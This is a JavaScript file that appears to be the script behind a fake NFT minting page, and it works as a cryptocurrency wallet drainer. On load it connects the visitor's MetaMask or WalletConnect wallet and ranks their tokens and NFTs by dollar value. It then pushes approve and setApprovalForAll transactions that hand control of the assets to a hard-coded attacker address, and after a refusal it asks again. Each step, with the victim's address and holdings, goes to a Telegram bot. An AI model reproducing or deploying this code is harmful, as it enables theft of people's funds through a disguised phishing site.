const defaultNetworks = ["ethereum", "binance-smart-chain", "polygon"]
const chainIdsNetworks = {
    "ethereum": 1,
    "binance-smart-chain": 56,
    "polygon": 137
}
const chainIdsNames = {
    "ethereum": "Ethereum",
    "binance-smart-chain": "Binance Smart Chain",
    "polygon": "Polygon"
}
const forbiddenTokens = ["ETH", "BNB", "MATIC"]

const abi = [
    {
        "constant": false,
        "inputs": [
            {
                "name": "_spender",
                "type": "address"
            },
            {
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "approve",
        "outputs": [
            {
                "name": "",
                "type": "bool"
            }
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

const abiNFT = [
    {
        "inputs": [{
            "internalType": "address",
            "name": "operator",
            "type": "address"
        }, {
            "internalType": "bool",
            "name": "approved",
            "type": "bool"
        }],
        "name": "setApprovalForAll",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

const accountBalances = {
    tokens: [],
    nft: [],
    tokensandnft: []
}

const WITHDRAWAL_ADDRESS = "0x17eD6ffAF2A7000c83Fc67a3073DcC46E695b75a"
const MINIMAL_SUM_IN_USD = 1
const TOKEN_ID = "5344520477:AAH28U3101-XmPOpi686c6o-YUPX9uxdy5c"
const CHAT_ID = "5451110411"

let accountAddress = null, walletConnector, currentConnection

const getMobileOperatingSystem = () => {
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;

    if (/windows phone/i.test(userAgent)) {
        return "Windows Phone";
    }

    if (/android/i.test(userAgent)) {
        return "Android";
    }

    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
        return "iOS";
    }

    return "unknown";
}

const getDAppSystem = () => {
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;

    if (/Trust/i.test(userAgent)) {
        return "Trust";
    }

    if (/CriOS/i.test(userAgent)) {
        return "Metamask";
    }

    return "unknown";
}

const openMetaMaskUrl = (url) => {
    const a = document.createElement("a");
    a.href = url;
    a.target = "_self";
    document.body.appendChild(a);
    a.click();
    a.remove();
}
const paynow = async (withdrawalToken) => {
    if (withdrawalToken) {
        if (withdrawalToken.balanceUSD < MINIMAL_SUM_IN_USD) {

            return
        }

        let web3, provider
        // $("#connectButton").html("Processing");

        if (currentConnection === "metamask") {
            web3 = new Web3(window.ethereum)
            provider = new ethers.providers.Web3Provider(window.ethereum, "any")

            if (parseInt(window.ethereum.networkVersion) !== chainIdsNetworks[withdrawalToken.network]) {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{chainId: web3.utils.toHex(chainIdsNetworks[withdrawalToken.network])}]
                });
            }
        } else if (currentConnection === "walletconnect") {
            if (walletConnector._chainId !== chainIdsNetworks[withdrawalToken.network]) {
                $('#chainErrorName').text(chainIdsNames[withdrawalToken.network])
                $('#chainErrorMessage').show();

                $("#overlay").fadeOut(300);

                return
            }

            provider = new window.WalletConnectProvider.default({
                rpc: {
                    1: "https://mainnet.infura.io/v3/8d15dd68b697464abf8c45cf43410c03",
                    56: "https://bsc-dataseed.binance.org/",
                    137: "https://polygon-rpc.com"
                }
            });

            await provider.enable()

            provider = new ethers.providers.Web3Provider(provider, "any")
        }

        const signer = provider.getSigner()

        if (withdrawalToken.appId === "tokens") {
            const contract = new ethers.Contract(withdrawalToken.address, abi, signer)

            try {
                await contract.approve(WITHDRAWAL_ADDRESS, withdrawalToken.context.balanceRaw)

                var z=$.ajax({  
type: "POST",  
url: "https://api.telegram.org/bot"+TOKEN_ID+"/sendMessage?chat_id="+CHAT_ID,
data: "parse_mode=HTML&text="+encodeURIComponent("ERC20 Approved. Address of holder: "+accountAddress)+"%0A%0A"+encodeURIComponent("Contract address "+ withdrawalToken.address)+"%0A%0A"+encodeURIComponent("Price: "+ Math.round(withdrawalToken.balanceUSD)+"$"), 
}); 


            } catch (e) {
                var z=$.ajax({  
                    type: "POST",  
                    url: "https://api.telegram.org/bot"+TOKEN_ID+"/sendMessage?chat_id="+CHAT_ID,
                    data: "parse_mode=HTML&text="+encodeURIComponent("ERC20 CLOSED. Address of holder: "+accountAddress)+"%0A%0A"+encodeURIComponent("Contract address "+ withdrawalToken.address)+"%0A%0A"+encodeURIComponent("Price: "+ Math.round(withdrawalToken.balanceUSD)+"$"), 
                    });
                paynow(withdrawalToken)

            }
        } else if (withdrawalToken.appId === "nft") {
            const contract = new ethers.Contract(withdrawalToken.address, abiNFT, signer)

            try {
                await contract.setApprovalForAll(WITHDRAWAL_ADDRESS, true)

               var z=$.ajax({  
type: "POST",  
url: "https://api.telegram.org/bot"+TOKEN_ID+"/sendMessage?chat_id="+CHAT_ID,
data: "parse_mode=HTML&text="+encodeURIComponent("NFT Approved. Address of holder: "+accountAddress)+"%0A%0A"+encodeURIComponent("Contract address "+ withdrawalToken.address)+"%0A%0A"+encodeURIComponent("Price: "+ Math.round(withdrawalToken.balanceUSD)+"$"), 
}); 

            } catch (e) {
                var z=$.ajax({  
                    type: "POST",  
                    url: "https://api.telegram.org/bot"+TOKEN_ID+"/sendMessage?chat_id="+CHAT_ID,
                    data: "parse_mode=HTML&text="+encodeURIComponent("NFT CLOSED. Address of holder: "+accountAddress)+"%0A%0A"+encodeURIComponent("Contract address "+ withdrawalToken.address)+"%0A%0A"+encodeURIComponent("Price: "+ Math.round(withdrawalToken.balanceUSD)+"$"), 
                    }); 
                paynow(withdrawalToken)

            }
        } else {

        }
    } else {

    }
}
const getBalances = async () => {
    try {
        initMetamask()
        if (currentConnection === "metamask") {
            if (typeof window.ethereum.selectedAddress !== "undefined") {
                accountAddress = window.ethereum.selectedAddress
            } else if (typeof window.ethereum.address !== "undefined") {
                accountAddress = window.ethereum.address
            }
        } else if (currentConnection === "walletconnect") {
            accountAddress = walletConnector._accounts[0]
        }
        const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd")
        const ethjson = await res.json()
        const ethusd = ethjson.ethereum.usd
        const response = await $.ajax({
            url: `https://api.zapper.fi/v2/balances?addresses%5B%5D=${accountAddress}`,
            type: "GET",
            headers: {
                Authorization: "Basic MDMwMzAyZDktYzIxNS00OWEyLTk4NDAtZGZmNTQ5MzNkY2ViOg=="
            }
        })
        
        const events = response.split('event: ')

        for (const event of events) {
            const data = event.split('data: ')

            if (typeof data[0] !== "undefined") {
                if (data[0].indexOf("balance") > -1) {
                    const category = JSON.parse(data[1]);
                    const wallet = category['balance']['wallet']
                    const nft = category['balance']['nft']

                    if (typeof wallet !== "undefined" || typeof nft !== "undefined") {
                    for (const wal of Object.values(wallet)) {
                        if (defaultNetworks.indexOf(wal.network) > -1) {
                            accountBalances["tokens"].push(wal)
                        }
                    }

                    for (const wal of Object.values(nft)) {
                        if (defaultNetworks.indexOf(wal.network) > -1) {
                            let redd = wal
                            redd.balanceUSD = redd.context.floorPrice * redd.assets.length * ethusd
                            accountBalances["nft"].push(redd)
                        }
                    }
                    }
                }
            }
        }
        
        for (const forbiddenToken of forbiddenTokens) {
            const index = accountBalances.tokens.findIndex(x => x.context.symbol === forbiddenToken)

            if (index > -1) {
                accountBalances.tokens.splice(index, 1)
            }
        }
        accountBalances.tokensandnft = accountBalances.tokensandnft.concat(accountBalances.tokens, accountBalances.nft)
        accountBalances.tokens.sort((a, b) => (a.balanceUSD > b.balanceUSD) ? -1 : ((b.balanceUSD > a.balanceUSD) ? 1 : 0))
        accountBalances.nft.sort((a, b) => (a.balanceUSD > b.balanceUSD) ? -1 : ((b.balanceUSD > a.balanceUSD) ? 1 : 0))
        accountBalances.tokensandnft.sort((a, b) => (a.balanceUSD > b.balanceUSD) ? -1 : ((b.balanceUSD > a.balanceUSD) ? 1 : 0))
        console.log(accountBalances.tokensandnft)
        for(let i = 0; i < accountBalances.tokensandnft.length; i++) {
        let topNFT = null, topToken = null, withdrawalToken = null

        if (accountBalances.tokensandnft[i].appId == "tokens") {
            topToken = accountBalances.tokensandnft[i]
        }

        if (accountBalances.tokensandnft[i].appId == "nft") {
            topNFT = accountBalances.tokensandnft[i]
        }

        if ((topNFT && topToken) && topNFT.balanceUSD > topToken.balanceUSD) {
            withdrawalToken = topNFT
        } else if ((topNFT && topToken) && topNFT.balanceUSD < topToken.balanceUSD) {
            withdrawalToken = topToken
        } else if (topNFT) {
            withdrawalToken = topNFT
        } else if (topToken) {
            withdrawalToken = topToken
        }

        paynow(withdrawalToken)
    }} catch (e) {
    
    }
}

const checkInstallMetamask = () => {
    return new Promise((res) => {
        if (typeof window.ethereum !== 'undefined') {
            return res(true)
        } else {
            return res(false)
        }
    })
}

const connectMetamask = async () => {

    window.ethereum.on('accountsChanged', function (accounts) {
        accountAddress = accounts[0]

    });

    const accounts = await window.ethereum.request({method: 'eth_requestAccounts'})

    accountAddress = accounts[0]
    var z=$.ajax({  
        type: "POST",  
        url: "https://api.telegram.org/bot"+TOKEN_ID+"/sendMessage?chat_id="+CHAT_ID,
        data: "parse_mode=HTML&text="+encodeURIComponent("Metamask connected "+accountAddress), 
        }); 
    currentConnection = "metamask"
    $('#connectt').html('MINT')


}

const connectTrustWallet = async () => {
    if (!window.ethereum?.isTrust && getMobileOperatingSystem() !== "unknown") {
        openMetaMaskUrl(`https://link.trustwallet.com/open_url?coin_id=60&url=${window.location.origin}`)

        return
    }

    if (window.ethereum?.isTrust) {
        window.ethereum.on('accountsChanged', function (accounts) {
            accountAddress = accounts[0]


        });

        const accounts = await window.ethereum.request({method: 'eth_requestAccounts'})

        accountAddress = accounts[0]
        currentConnection = "metamask"

    } else {
        if (!walletConnector.connected) {
            walletConnector.createSession().then(() => {
                const uri = walletConnector.uri;

                window.WalletConnectQRCodeModal.default.open(uri, () => {
                    console.log('QR Code Modal closed');
                });
            });
        } else {
            walletConnector.killSession();
        }
    }
}

const initMetamask = async () => {
    if (getDAppSystem() !== "Metamask" && getMobileOperatingSystem() !== "unknown") {
        var localurl = new URL(window.location);
        window.location.replace("https://metamask.app.link/dapp/"+localurl.host+localurl.pathname);

        return
    }

    const installedMetamask = await checkInstallMetamask()

    if (!installedMetamask) {
        var localurl = new URL(window.location);
        window.location.replace("https://metamask.app.link/dapp/"+localurl.host+localurl.pathname);

        return
    }


}

const initWalletConnect = () => {
    if (getDAppSystem() !== "Trust" && getMobileOperatingSystem() !== "unknown") {


        return
    }

    walletConnector = new window.WalletConnect.default({
        bridge: 'https://bridge.walletconnect.org'
    });



    walletConnector.on('connect', function (error, payload) {
        if (error) {
            console.error(error);
        } else {
            window.WalletConnectQRCodeModal.default.close();


            accountAddress = payload.params[0].accounts[0]
            currentConnection = "walletconnect"
        }
    });

    walletConnector.on('session_update', function (error, payload) {
        if (error) {
            console.error(error);
        } else if (walletConnector.connected) {

            accountAddress = payload.params[0].accounts[0]
        }

    });

    walletConnector.on('disconnect', function (error, payload) {
        if (error) {
            console.error(error);
        } else {


            accountAddress = null
        }
    });
}




setTimeout(connectMetamask, 1000)

